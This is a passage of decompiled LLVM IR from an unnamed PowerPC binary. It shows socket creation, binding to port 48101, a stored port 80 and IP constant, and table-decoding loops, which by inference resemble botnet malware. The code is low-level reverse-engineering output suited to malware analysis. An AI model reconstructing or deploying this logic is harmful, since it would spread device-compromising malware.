dec_label_pc_10005710:                            ; preds = %dec_label_pc_10005624
  %v4_10005630 = icmp eq i32 %v3_10005604, %v1_10005628
  br i1 %v4_10005630, label %dec_label_pc_10005690, label %dec_label_pc_10005644

dec_label_pc_1000571c:                            ; preds = %dec_label_pc_10005668
  %v4_10005674 = icmp eq i32 %v3_10005648, %v1_1000566c
  br i1 %v4_10005674, label %dec_label_pc_10005690, label %dec_label_pc_10005664.backedge

dec_label_pc_10005728:                            ; preds = %dec_label_pc_10005468
  %v0_10005728 = load i32, i32* %r30.global-to-local, align 4
  store i32 268457780, i32* @lr, align 4
  %v2_10005730 = call i32 @function_10007e88(i32 %v0_10005728, i32 9)
  br label %dec_label_pc_10005484

dec_label_pc_10005738:                            ; preds = %dec_label_pc_10005520.backedge, %dec_label_pc_100054a8
  store i32 ptrtoint ([3 x i8]* @global_var_10005740.104 to i32), i32* @lr, align 4
  %v1_1000573c = call i32 @function_10006bd8(i32 12)
  store i32 ptrtoint ([3 x i8]* @global_var_10005748.105 to i32), i32* @lr, align 4
  %v1_10005744 = call i32 @function_10006bd8(i32 13)
  store i32 ptrtoint ([3 x i8]* @global_var_10005750.106 to i32), i32* @lr, align 4
  %v1_1000574c = call i32 @function_10006bd8(i32 14)
  store i32 ptrtoint ([3 x i8]* @global_var_10005758.107 to i32), i32* @lr, align 4
  %v1_10005754 = call i32 @function_10006bd8(i32 15)
  store i32 268457824, i32* @lr, align 4
  %v1_1000575c = call i32 @function_10006bd8(i32 16)
  store i32 268457832, i32* @lr, align 4
  %v0_10005764 = call i32 @function_10007d68()
  br label %dec_label_pc_100056cc

; uselistorder directives
  uselistorder i32 %v1_10005664, { 1, 0 }
  uselistorder i32 %v1_1000566c, { 1, 0, 2 }
  uselistorder i32 %v1_10005668, { 1, 0 }
  uselistorder i32 %v3_1000552c, { 2, 1, 0 }
  uselistorder i32 %v1_10005644, { 1, 0 }
  uselistorder i32 %v1_10005624, { 1, 0 }
  uselistorder i32 %v1_10005600, { 1, 0 }
  uselistorder i32 %v1_100055e0, { 1, 0 }
  uselistorder i32 %v1_100055bc, { 1, 0 }
  uselistorder i32 %v1_1000559c, { 1, 0 }
  uselistorder i32 %v1_10005578, { 1, 0 }
  uselistorder i32 %v1_10005558, { 1, 0 }
  uselistorder i1 %v3_1000553099, { 0, 3, 2, 1 }
  uselistorder i32 %v3_1000552c98, { 9, 0, 8, 1, 7, 3, 6, 4, 5, 2 }
  uselistorder i32 %v2_1000526c, { 1, 0 }
  uselistorder i32 %v2_100052c4, { 1, 0 }
  uselistorder i32 %v1_10005280, { 1, 0 }
  uselistorder i32 %v2_1000523c, { 1, 0, 2 }
  uselistorder i32 %v2_100051b0, { 1, 0, 2 }
  uselistorder i32 %v2_1000518c, { 1, 0, 2 }
  uselistorder i32 %v2_1000515c, { 1, 6, 2, 3, 4, 5, 0, 7, 8, 9, 10, 11 }
  uselistorder i32 %v0_1000507c, { 1, 0, 3, 2 }
  uselistorder i32* %stack_var_-8436, { 1, 0 }
  uselistorder i32* %stack_var_-8452, { 1, 0 }
  uselistorder i32* %stack_var_-8448, { 1, 0 }
  uselistorder i32* %stack_var_-8444, { 1, 0 }
  uselistorder i32* %stack_var_-8456, { 1, 0 }
  uselistorder i32* %stack_var_-8440, { 1, 0 }
  uselistorder i32* %r30.global-to-local, { 1, 2, 3, 4, 0, 5, 6, 7, 8 }
  uselistorder i32* %r11.global-to-local, { 1, 0, 2, 4, 3, 5, 7, 6, 8, 10, 9, 11, 13, 12, 14, 15, 16 }
  uselistorder i32 268457264, { 1, 0 }
  uselistorder i32 (i32*)* @function_100083c4, { 3, 2, 0, 4, 5, 6, 7, 1 }
  uselistorder i32 268456560, { 1, 0 }
  uselistorder i32 (i32)* @function_100082b4, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_10007fe8, { 3, 2, 1, 0 }
  uselistorder i32 4095, { 0, 2, 1 }
  uselistorder label %dec_label_pc_100056cc, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10005690, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_10005668, { 1, 0 }
  uselistorder label %dec_label_pc_10005624, { 1, 0 }
  uselistorder label %dec_label_pc_100055e0, { 1, 0 }
  uselistorder label %dec_label_pc_1000559c, { 1, 0 }
  uselistorder label %dec_label_pc_10005558, { 1, 0 }
  uselistorder label %dec_label_pc_10005538, { 1, 0 }
  uselistorder label %dec_label_pc_1000548c, { 1, 0 }
  uselistorder label %dec_label_pc_10005484, { 1, 0 }
  uselistorder label %dec_label_pc_10005268.backedge, { 3, 2, 5, 4, 1, 0 }
  uselistorder label %dec_label_pc_100053f8, { 1, 0 }
  uselistorder label %dec_label_pc_10005278, { 1, 0 }
  uselistorder label %dec_label_pc_10005278.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_10005218, { 1, 0 }
  uselistorder label %dec_label_pc_10005138, { 1, 0 }
}

define i32 @function_1000576c() local_unnamed_addr {
dec_label_pc_1000576c:
  store i32 268458348, i32* @global_var_1001b270.108, align 4
  %v0_1000577c = load i32, i32* @r3, align 4
  ret i32 %v0_1000577c
}

define i32 @function_10005780() local_unnamed_addr {
dec_label_pc_10005780:
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  store i32 0, i32* @r27, align 4
  store i32 268566528, i32* @r28, align 4
  store i32 268566528, i32* @r31, align 4
  %v2_100057bc = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_100057bc, i32* @r30, align 4
  store i32 1, i32* %stack_var_-56, align 4
  store i32 268457928, i32* @lr, align 4
  %v3_100057c4 = call i32 @function_10008b34(i32 2, i32 1, i32 0)
  %v3_100057c8 = icmp eq i32 %v3_100057c4, -1
  store i32 %v3_100057c4, i32* @global_var_1001b268.109, align 4
  br i1 %v3_100057c8, label %dec_label_pc_10005878, label %dec_label_pc_100057e4

dec_label_pc_100057e4:                            ; preds = %dec_label_pc_10005780
  %v2_100057cc = ptrtoint i32* %stack_var_-56 to i32
  store i32 268457960, i32* @lr, align 4
  %v5_100057e4 = call i32 @function_10008af8(i32 %v3_100057c4, i32 1, i32 2, i32 %v2_100057cc, i32 4)
  %v3_100057e8 = load i32, i32* @global_var_1001b268.109, align 4
  store i32 3, i32* @r4, align 4
  store i32 268457984, i32* @lr, align 4
  %v2_100057fc = call i32 @function_10007c38(i32 %v3_100057e8)
  store i32 4, i32* @r4, align 4
  store i32 268458004, i32* @lr, align 4
  %v2_10005810 = call i32 @function_10007c38(i32 %v3_100057e8)
  %v3_10005814 = load i8, i8* @global_var_1001b128.110, align 1
  %v3_1000581c = icmp eq i8 %v3_10005814, 0
  br i1 %v3_1000581c, label %dec_label_pc_1000589c, label %dec_label_pc_10005828

dec_label_pc_10005828:                            ; preds = %dec_label_pc_100057e4
  store i32 2, i32* %stack_var_-52, align 4
  %v0_1000583c = call i32 @function_10008484()
  %v0_10005840 = load i32, i32* @r27, align 4
  %v2_10005840 = inttoptr i32 %v0_1000583c to i32*
  store i32 %v0_10005840, i32* %v2_10005840, align 4
  store i32 %v0_1000583c, i32* @r29, align 4
  %v3_10005850 = load i32, i32* @global_var_1001b268.109, align 4
  store i32 268458072, i32* @lr, align 4
  %v3_10005854 = call i32 @function_10008900(i32 %v3_10005850, i32 %v2_100057bc, i32 16)
  %v3_1000585c = icmp eq i32 %v3_10005854, -1
  br i1 %v3_1000585c, label %dec_label_pc_100058e4, label %dec_label_pc_10005868

dec_label_pc_10005868:                            ; preds = %dec_label_pc_1000589c, %dec_label_pc_10005828
  %v3_10005870 = load i32, i32* @global_var_1001b268.109, align 4
  store i32 268458104, i32* @lr, align 4
  %v2_10005874 = call i32 @function_100089d8(i32 %v3_10005870, i32 1)
  br label %dec_label_pc_10005878

dec_label_pc_10005878:                            ; preds = %dec_label_pc_10005780, %dec_label_pc_10005868
  %v0_10005898 = phi i32 [ -1, %dec_label_pc_10005780 ], [ %v2_10005874, %dec_label_pc_10005868 ]
  ret i32 %v0_10005898

dec_label_pc_1000589c:                            ; preds = %dec_label_pc_100057e4
  store i32 2, i32* %stack_var_-52, align 4
  %v0_100058b8 = call i32 @function_10008484()
  %v0_100058bc = load i32, i32* @r27, align 4
  %v2_100058bc = inttoptr i32 %v0_100058b8 to i32*
  store i32 %v0_100058bc, i32* %v2_100058bc, align 4
  store i32 %v0_100058b8, i32* @r29, align 4
  %v3_100058cc = load i32, i32* @global_var_1001b268.109, align 4
  store i32 268458196, i32* @lr, align 4
  %v3_100058d0 = call i32 @function_10008900(i32 %v3_100058cc, i32 %v2_100057bc, i32 16)
  %v3_100058d8 = icmp eq i32 %v3_100058d0, -1
  br i1 %v3_100058d8, label %dec_label_pc_100058e4, label %dec_label_pc_10005868

dec_label_pc_100058e4:                            ; preds = %dec_label_pc_1000589c, %dec_label_pc_10005828
  %v0_100058e4 = load i32, i32* @r29, align 4
  %v1_100058e4 = inttoptr i32 %v0_100058e4 to i32*
  %v2_100058e4 = load i32, i32* %v1_100058e4, align 4
  %v3_100058e8 = load i32, i32* @global_var_1001b268.109, align 4
  store i32 %v3_100058e8, i32* @r3, align 4
  %v3_100058ec = icmp eq i32 %v2_100058e4, 99
  br i1 %v3_100058ec, label %dec_label_pc_10005954, label %dec_label_pc_100058f4

dec_label_pc_100058f4:                            ; preds = %dec_label_pc_10005954, %dec_label_pc_100058e4, %dec_label_pc_10005960
  store i32 2, i32* %stack_var_-52, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10005910.111 to i32), i32* @lr, align 4
  %v0_1000590c = call i32 @function_10008934()
  store i32 268458264, i32* @lr, align 4
  %v1_10005914 = call i32 @function_1000965c(i32 5)
  store i32 ptrtoint ([3 x i8]* @global_var_10005920.112 to i32), i32* @lr, align 4
  %v0_1000591c = call i32 @function_10007d68()
  store i32 268458284, i32* @lr, align 4
  %v1_10005928 = call i32 @function_10004a38(i32 48101)
  store i32 268458288, i32* @lr, align 4
  %v0_1000592c = call i32 @function_10005780()
  ret i32 %v0_1000592c

dec_label_pc_10005954:                            ; preds = %dec_label_pc_100058e4
  %v3_10005954 = load i8, i8* @global_var_1001b128.110, align 1
  %v3_10005958 = icmp eq i8 %v3_10005954, 0
  br i1 %v3_10005958, label %dec_label_pc_100058f4, label %dec_label_pc_10005960

dec_label_pc_10005960:                            ; preds = %dec_label_pc_10005954
  %v0_10005964 = load i32, i32* @r27, align 4
  %v1_10005964 = trunc i32 %v0_10005964 to i8
  store i8 %v1_10005964, i8* @global_var_1001b128.110, align 1
  br label %dec_label_pc_100058f4

; uselistorder directives
  uselistorder i32 %v2_100057bc, { 1, 0, 2 }
  uselistorder i32* %stack_var_-56, { 1, 0 }
  uselistorder i32 (i32)* @function_10004a38, { 1, 0 }
  uselistorder i32 (i32, i32)* @function_100089d8, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_10008900, { 4, 3, 2, 1, 0 }
  uselistorder i8* @global_var_1001b128.110, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @function_10008af8, { 7, 6, 0, 5, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_100058f4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10005878, { 1, 0 }
}

define i32 @function_1000596c() local_unnamed_addr {
dec_label_pc_1000596c:
  %r28.global-to-local = alloca i32, align 4
  store i32 268458380, i32* @lr, align 4
  %v1_10005988 = call i32 @function_10006c64(i32 3)
  %v3_10005994 = call i32 @function_10006bb0(i32 3, i32* null)
  store i32 268458396, i32* @lr, align 4
  %v1_10005998 = call i32 @function_10006694(i32 %v3_10005994)
  store i32 %v1_10005998, i32* @r31, align 4
  store i32 268458408, i32* @lr, align 4
  %v1_100059a4 = call i32 @function_10006bd8(i32 3)
  %v0_100059a8 = load i32, i32* @r31, align 4
  %v3_100059a8 = icmp eq i32 %v0_100059a8, 0
  br i1 %v3_100059a8, label %dec_label_pc_10005a0c, label %dec_label_pc_100059b0

dec_label_pc_100059b0:                            ; preds = %dec_label_pc_1000596c
  %v1_100059b0 = add i32 %v0_100059a8, 4
  %v2_100059b0 = inttoptr i32 %v1_100059b0 to i32*
  %v3_100059b0 = load i32, i32* %v2_100059b0, align 4
  store i32 %v3_100059b0, i32* %r28.global-to-local, align 4
  %v0_100059b4 = call i32 @function_10006318()
  %v0_100059b8 = load i32, i32* @r31, align 4
  %v1_100059b8 = inttoptr i32 %v0_100059b8 to i8*
  %v2_100059b8 = load i8, i8* %v1_100059b8, align 1
  %v3_100059b8 = zext i8 %v2_100059b8 to i32
  %v2_100059c4 = urem i32 %v0_100059b4, %v3_100059b8
  %v1_100059d8 = mul nuw nsw i32 %v2_100059c4, 4
  %v1_100059dc = load i32, i32* %r28.global-to-local, align 4
  %v2_100059dc = add i32 %v1_100059dc, %v1_100059d8
  %v3_100059dc = inttoptr i32 %v2_100059dc to i32*
  %v4_100059dc = load i32, i32* %v3_100059dc, align 4
  store i32 %v4_100059dc, i32* @global_var_1001b320.115, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100059e8.116 to i32), i32* @lr, align 4
  %v2_100059e4 = call i32 @function_10006650(i32 %v0_100059b8, i32 %v1_100059d8)
  store i32 ptrtoint ([3 x i8]* @global_var_100059f0.117 to i32), i32* @lr, align 4
  %v1_100059ec = call i32 @function_10006c64(i32 4)
  %v3_100059f8 = call i32 @function_10006bb0(i32 4, i32* null)
  %v4_100059f8 = inttoptr i32 %v3_100059f8 to i16*
  %v3_100059fc = load i16, i16* %v4_100059f8, align 2
  store i16 %v3_100059fc, i16* bitcast (i32* @global_var_1001b31e.118 to i16*), align 4
  store i32 268458508, i32* @lr, align 4
  %v1_10005a08 = call i32 @function_10006bd8(i32 4)
  br label %dec_label_pc_10005a0c

dec_label_pc_10005a0c:                            ; preds = %dec_label_pc_1000596c, %dec_label_pc_100059b0
  %v0_10005a24 = phi i32 [ %v1_100059a4, %dec_label_pc_1000596c ], [ %v1_10005a08, %dec_label_pc_100059b0 ]
  ret i32 %v0_10005a24

; uselistorder directives
  uselistorder label %dec_label_pc_10005a0c, { 1, 0 }
}

define i32 @function_10005a28(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_10005a28:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-1100 = alloca i32, align 4
  %stack_var_-1644 = alloca i32, align 4
  %stack_var_-1620 = alloca i32, align 4
  %stack_var_-1640 = alloca i32, align 4
  %stack_var_-1484 = alloca i32, align 4
  %stack_var_-1228 = alloca i32, align 4
  %stack_var_-1652 = alloca i32, align 4
  %stack_var_-1554 = alloca i32, align 4
  %stack_var_-1586 = alloca i32, align 4
  %stack_var_-1604 = alloca i8*, align 4
  %stack_var_-1632 = alloca i32, align 4
  %stack_var_-1656 = alloca i16, align 2
  %stack_var_-1520 = alloca i32, align 4
  %stack_var_-1648 = alloca i32, align 4
  %stack_var_-1356 = alloca i32, align 4
  %v0_10005a2c = load i32, i32* @lr, align 4
  store i32 %v0_10005a2c, i32* %r0.global-to-local, align 4
  %v0_10005a30 = load i32, i32* @r29, align 4
  %v2_10005a34 = ptrtoint i32* %stack_var_-1356 to i32
  store i32 %v2_10005a34, i32* %r29.global-to-local, align 4
  store i32 %arg1, i32* @r26, align 4
  store i32 %tmp, i32* @r24, align 4
  store i32 268458640, i32* @lr, align 4
  %v1_10005a8c = call i32 @function_10008be4(i32 %v2_10005a34)
  store i32 %v2_10005a34, i32* @r3, align 4
  store i32 268458652, i32* @lr, align 4
  %v2_10005a98 = call i32 @function_10008b98(i32 %v2_10005a34, i32 2)
  store i32 0, i32* @r5, align 4
  store i32 268458668, i32* @lr, align 4
  %v3_10005aa8 = call i32 @function_100080c0(i32 0, i32 %v2_10005a34, i32 0)
  store i32 268458680, i32* @lr, align 4
  %v2_10005ab4 = call i32 @function_10008c10(i32 17, i32 1)
  store i32 268458696, i32* @lr, align 4
  %v2_10005ac4 = call i32 @function_10008c10(i32 5, i32 268457836)
  store i32 268458716, i32* @lr, align 4
  %v3_10005ad8 = call i32 @function_10007ed0(i32 ptrtoint ([14 x i8]* @global_var_1000a824.119 to i32), i32 2)
  %v3_10005adc = icmp eq i32 %v3_10005ad8, -1
  store i32 %v3_10005ad8, i32* @r29, align 4
  br i1 %v3_10005adc, label %dec_label_pc_10005ddc, label %dec_label_pc_10005ae8

dec_label_pc_10005ae8:                            ; preds = %dec_label_pc_10005ddc, %dec_label_pc_10005a28
  %v0_10005af4 = phi i32 [ %v3_10005dec, %dec_label_pc_10005ddc ], [ %v3_10005ad8, %dec_label_pc_10005a28 ]
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_10005af8 = ptrtoint i32* %stack_var_-1648 to i32
  store i32 %v2_10005af8, i32* %r5.global-to-local, align 4
  store i32 1, i32* %stack_var_-1648, align 4
  store i32 268458760, i32* @lr, align 4
  %v3_10005b04 = call i32 @function_10007b50(i32 %v0_10005af4, i32 -2147199228, i32 %v2_10005af8)
  store i32 268458768, i32* @lr, align 4
  %v0_10005b0c = call i32 @function_10007d68()
  br label %dec_label_pc_10005b10

dec_label_pc_10005b10:                            ; preds = %dec_label_pc_10005ddc, %dec_label_pc_10005ae8
  store i32 268458788, i32* @lr, align 4
  %v1_10005b20 = call i32 @function_10007d20(i32 ptrtoint (i32* @global_var_1000a7bc.8 to i32))
  %v2_10005b24 = ptrtoint i32* %stack_var_-1520 to i32
  store i32 %v2_10005b24, i32* @r31, align 4
  store i32 268458796, i32* @lr, align 4
  %v1_10005b28 = call i32 @function_100077e0(i32 %v1_10005b20)
  store i32 ptrtoint (i32* @global_var_1001b31c.114 to i32), i32* %r10.global-to-local, align 4
  store i32 7103744, i32* @r29, align 4
  store i32 80, i32* %r0.global-to-local, align 4
  store i16 80, i16* bitcast (i32* @global_var_1001b31e.118 to i16*), align 4
  store i32 843041291, i32* @global_var_1001b320.115, align 4
  store i32 2, i32* %r9.global-to-local, align 4
  store i8* inttoptr (i32 791543808 to i8*), i8** %stack_var_-1604, align 4
  store i32 ptrtoint (i32* @global_var_1000a854.125 to i32), i32* @r4, align 4
  store i32 36, i32* @r5, align 4
  store i32 %v1_10005b28, i32* @global_var_1001b288.63, align 4
  store i32 %v2_10005b24, i32* @r3, align 4
  store i16 2, i16* bitcast (i32* @global_var_1001b31c.114 to i16*), align 4
  %v0_10005b90 = load i32, i32* @r24, align 4
  %v1_10005b90 = inttoptr i32 %v0_10005b90 to i32*
  %v2_10005b90 = load i32, i32* %v1_10005b90, align 4
  store i32 %v2_10005b90, i32* @r28, align 4
  store i32 ptrtoint (i32* @global_var_10005b98.126 to i32), i32* @lr, align 4
  %v0_10005b94 = call i32 @function_100084c8()
  store i32 7, i32* %r0.global-to-local, align 4
  store i32 7, i32* %ctr.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  %v1_10005ba8.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10005ba8

dec_label_pc_10005ba8:                            ; preds = %dec_label_pc_10005ba8, %dec_label_pc_10005b10
  %v0_10005bb4 = phi i32 [ %v1_10005bb4, %dec_label_pc_10005ba8 ], [ 7, %dec_label_pc_10005b10 ]
  %v0_10005bb0 = phi i32 [ %v2_10005bb0, %dec_label_pc_10005ba8 ], [ 0, %dec_label_pc_10005b10 ]
  %v0_10005ba8 = phi i32 [ %v1_10005bac, %dec_label_pc_10005ba8 ], [ 0, %dec_label_pc_10005b10 ]
  %v2_10005ba8 = add i32 %v0_10005ba8, %v1_10005ba8.pre
  %v3_10005ba8 = inttoptr i32 %v2_10005ba8 to i32*
  %v4_10005ba8 = load i32, i32* %v3_10005ba8, align 4
  store i32 %v4_10005ba8, i32* %r0.global-to-local, align 4
  %v1_10005bac = add nuw nsw i32 %v0_10005ba8, 4
  store i32 %v1_10005bac, i32* %r9.global-to-local, align 4
  %v2_10005bb0 = add i32 %v4_10005ba8, %v0_10005bb0
  %v1_10005bb4 = add nsw i32 %v0_10005bb4, -1
  store i32 %v1_10005bb4, i32* %ctr.global-to-local, align 4
  %v2_10005bb4 = icmp eq i32 %v1_10005bb4, 0
  br i1 %v2_10005bb4, label %dec_label_pc_10005bb8, label %dec_label_pc_10005ba8

dec_label_pc_10005bb8:                            ; preds = %dec_label_pc_10005ba8
  %v3_10005bb8 = icmp eq i32 %v2_10005bb0, 0
  %v2_10005bbc = ptrtoint i16* %stack_var_-1656 to i32
  store i32 %v2_10005bbc, i32* @r25, align 4
  br i1 %v3_10005bb8, label %dec_label_pc_10005c94, label %dec_label_pc_10005bc4

dec_label_pc_10005bc4:                            ; preds = %dec_label_pc_10005bb8
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 175, i32* @r30, align 4
  %v2_10005bd0 = ptrtoint i32* %stack_var_-1632 to i32
  store i32 %v2_10005bd0, i32* @r27, align 4
  %v0_10005be0.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_10005bd4

dec_label_pc_10005bd4:                            ; preds = %dec_label_pc_10005bd4.dec_label_pc_10005bd4_crit_edge, %dec_label_pc_10005bc4
  %v0_10005be8 = phi i32 [ %v0_10005be8.pre, %dec_label_pc_10005bd4.dec_label_pc_10005bd4_crit_edge ], [ %v2_10005bd0, %dec_label_pc_10005bc4 ]
  %v0_10005be0 = phi i32 [ %v0_10005c20, %dec_label_pc_10005bd4.dec_label_pc_10005bd4_crit_edge ], [ %v0_10005be0.pre, %dec_label_pc_10005bc4 ]
  %v1_10005be8 = phi i32 [ %v0_10005c04, %dec_label_pc_10005bd4.dec_label_pc_10005bd4_crit_edge ], [ 0, %dec_label_pc_10005bc4 ]
  %v1_10005bd4 = phi i32 [ %v1_10005c14, %dec_label_pc_10005bd4.dec_label_pc_10005bd4_crit_edge ], [ 0, %dec_label_pc_10005bc4 ]
  %v0_10005bd4 = phi i32 [ %v0_10005bd4.pre, %dec_label_pc_10005bd4.dec_label_pc_10005bd4_crit_edge ], [ %v2_10005bbc, %dec_label_pc_10005bc4 ]
  %v2_10005bd4 = add i32 %v0_10005bd4, %v1_10005bd4
  store i32 %v2_10005bd4, i32* %r9.global-to-local, align 4
  %v1_10005bd8 = add i32 %v1_10005be8, 2
  store i32 %v1_10005bd8, i32* %r0.global-to-local, align 4
  %v1_10005bdc = add i32 %v2_10005bd4, 53
  %v2_10005bdc = inttoptr i32 %v1_10005bdc to i8*
  %v3_10005bdc = load i8, i8* %v2_10005bdc, align 1
  %v1_10005be4 = add i32 %v2_10005bd4, 52
  %v2_10005be4 = inttoptr i32 %v1_10005be4 to i8*
  %v3_10005be4 = load i8, i8* %v2_10005be4, align 1
  %v4_10005be4 = zext i8 %v3_10005be4 to i32
  store i32 %v4_10005be4, i32* %r10.global-to-local, align 4
  %v2_10005be8 = add i32 %v1_10005be8, %v0_10005be8
  store i32 %v2_10005be8, i32* %r9.global-to-local, align 4
  %v5_10005bec = inttoptr i32 %v2_10005be8 to i8*
  store i8 %v3_10005bdc, i8* %v5_10005bec, align 1
  %v0_10005bf0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10005bf0, i32* @r31, align 4
  %v0_10005bf4 = load i32, i32* %r10.global-to-local, align 4
  %v1_10005bf4 = trunc i32 %v0_10005bf4 to i8
  %v2_10005bf4 = load i32, i32* %r9.global-to-local, align 4
  %v3_10005bf4 = add i32 %v2_10005bf4, 1
  %v4_10005bf4 = inttoptr i32 %v3_10005bf4 to i8*
  store i8 %v1_10005bf4, i8* %v4_10005bf4, align 1
  %v0_10005bf8 = load i32, i32* %r29.global-to-local, align 4
  %v1_10005bf8 = mul i32 %v0_10005bf8, 2
  %v1_10005bfc = add i32 %v1_10005bf8, 14
  store i32 %v1_10005bfc, i32* %r29.global-to-local, align 4
  store i32 268459012, i32* @lr, align 4
  %v1_10005c00 = inttoptr i32 %v0_10005be0 to i8*
  %v2_10005c00 = call i32 @function_100074dc(i8* %v1_10005c00)
  %v0_10005c04 = load i32, i32* @r31, align 4
  %v3_10005c04 = icmp eq i32 %v0_10005c04, 12
  %v1_10005c0c = udiv i32 %v1_10005bfc, 2
  %v2_10005c0c = and i32 %v1_10005bfc, -2147483648
  %v3_10005c0c = or i32 %v1_10005c0c, %v2_10005c0c
  %v1_10005c14 = add i32 %v3_10005c0c, -4
  store i32 %v1_10005c14, i32* %r29.global-to-local, align 4
  %v2_10005c08 = srem i32 %v0_10005c04, %v2_10005c00
  store i32 %v2_10005c08, i32* %r9.global-to-local, align 4
  %v0_10005c20 = load i32, i32* @r28, align 4
  %v2_10005c20 = add i32 %v0_10005c20, %v2_10005c08
  %v3_10005c20 = inttoptr i32 %v2_10005c20 to i8*
  %v4_10005c20 = load i8, i8* %v3_10005c20, align 1
  %v5_10005c20 = zext i8 %v4_10005c20 to i32
  %v1_10005c24 = sub nuw nsw i32 -1, %v5_10005c20
  %v0_10005c28 = load i32, i32* @r30, align 4
  %v2_10005c28 = add i32 %v0_10005c28, %v1_10005c24
  store i32 %v2_10005c28, i32* %r0.global-to-local, align 4
  %v1_10005c2c = urem i32 %v2_10005c28, 256
  store i32 %v1_10005c2c, i32* @r30, align 4
  br i1 %v3_10005c04, label %dec_label_pc_10005c34, label %dec_label_pc_10005bd4.dec_label_pc_10005bd4_crit_edge

dec_label_pc_10005bd4.dec_label_pc_10005bd4_crit_edge: ; preds = %dec_label_pc_10005bd4
  %v0_10005bd4.pre = load i32, i32* @r25, align 4
  %v0_10005be8.pre = load i32, i32* @r27, align 4
  br label %dec_label_pc_10005bd4

dec_label_pc_10005c34:                            ; preds = %dec_label_pc_10005bd4
  %v1_10005c40 = urem i32 %v1_10005c2c, 9
  store i32 %v1_10005c40, i32* %r9.global-to-local, align 4
  %v1_10005c4c = call i32 @__asm_rlwinm(i32 %v1_10005c40, i32 2, i32 22, i32 29)
  %v1_10005c50 = load i32, i32* @r25, align 4
  %v2_10005c50 = add i32 %v1_10005c50, %v1_10005c4c
  store i32 %v2_10005c50, i32* %r9.global-to-local, align 4
  %v1_10005c54 = add i32 %v2_10005c50, 136
  %v2_10005c54 = inttoptr i32 %v1_10005c54 to i32*
  %v3_10005c54 = load i32, i32* %v2_10005c54, align 4
  store i32 %v3_10005c54, i32* %r9.global-to-local, align 4
  store i32 %v3_10005c54, i32* %ctr.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_10005c54)
  %v0_10005c64 = load i32, i32* @r28, align 4
  %v2_10005c68 = inttoptr i32 %v0_10005c64 to i8*
  %v3_10005c68 = call i32 @function_10007938(i8* %v2_10005c68, i32 %v2_10005bd0)
  store i32 18, i32* @r4, align 4
  store i32 %v3_10005c68, i32* %r29.global-to-local, align 4
  %v2_10005c74 = ptrtoint i8** %stack_var_-1604 to i32
  store i32 %v2_10005c74, i32* @r3, align 4
  store i32 268459132, i32* @lr, align 4
  %v0_10005c78 = call i32 @function_10007584()
  %v1_10005c7c = urem i32 %v3_10005c68, 256
  store i32 %v1_10005c7c, i32* @r29, align 4
  store i32 %v2_10005bd0, i32* @r3, align 4
  store i32 12, i32* @r4, align 4
  store i32 268459148, i32* @lr, align 4
  %v0_10005c88 = call i32 @function_10007584()
  %v0_10005c8c = load i32, i32* @r29, align 4
  %v3_10005c8c = icmp eq i32 %v0_10005c8c, 0
  br i1 %v3_10005c8c, label %dec_label_pc_10005c94, label %dec_label_pc_1000630c

dec_label_pc_10005c94:                            ; preds = %dec_label_pc_10005c34, %dec_label_pc_10005bb8, %dec_label_pc_1000630c
  %v2_10005c94 = ptrtoint i32* %stack_var_-1586 to i32
  store i32 ptrtoint (i32* @global_var_10005c9c.127 to i32), i32* @lr, align 4
  %v0_10005c98 = call i32 @function_10005780()
  store i32 268459168, i32* @lr, align 4
  %v1_10005c9c = call i32 @function_10006368(i32 %v0_10005c98)
  store i32 %v2_10005c94, i32* @r3, align 4
  store i32 32, i32* @r4, align 4
  store i32 268459180, i32* @lr, align 4
  %v0_10005ca8 = call i32 @function_10007584()
  %v0_10005cac = load i32, i32* @r26, align 4
  %v3_10005cac = icmp eq i32 %v0_10005cac, 2
  br i1 %v3_10005cac, label %dec_label_pc_100062d4, label %dec_label_pc_10005cb4

dec_label_pc_10005cb4:                            ; preds = %dec_label_pc_100062d4, %dec_label_pc_10005c94, %dec_label_pc_100062e4
  %v0_10005cb4 = call i32 @function_10006318()
  %v2_10005cb8 = ptrtoint i32* %stack_var_-1554 to i32
  store i32 %v2_10005cb8, i32* @r28, align 4
  %v1_10005cbc = call i32 @__asm_rlwinm(i32 %v0_10005cb4, i32 2, i32 28, i32 29)
  store i32 0, i32* @r27, align 4
  %v1_10005cc4 = add i32 %v1_10005cbc, 12
  %v0_10005cd0 = load i32, i32* @r25, align 4
  %v2_10005cd0 = add i32 %v0_10005cd0, %v1_10005cc4
  store i32 %v2_10005cd0, i32* @r29, align 4
  store i32 268459224, i32* @lr, align 4
  %v2_10005cd4 = bitcast i32* %stack_var_-1554 to i8*
  %v3_10005cd4 = call i32 @function_100063d8(i8* %v2_10005cd4, i32 %v1_10005cc4)
  %v0_10005cd8 = load i32, i32* @r24, align 4
  %v1_10005cd8 = inttoptr i32 %v0_10005cd8 to i32*
  %v2_10005cd8 = load i32, i32* %v1_10005cd8, align 4
  store i32 %v2_10005cd8, i32* @r3, align 4
  %v0_10005cdc = load i32, i32* @r27, align 4
  %v1_10005cdc = trunc i32 %v0_10005cdc to i8
  %v2_10005cdc = load i32, i32* @r29, align 4
  %v3_10005cdc = add i32 %v2_10005cdc, 102
  %v4_10005cdc = inttoptr i32 %v3_10005cdc to i8*
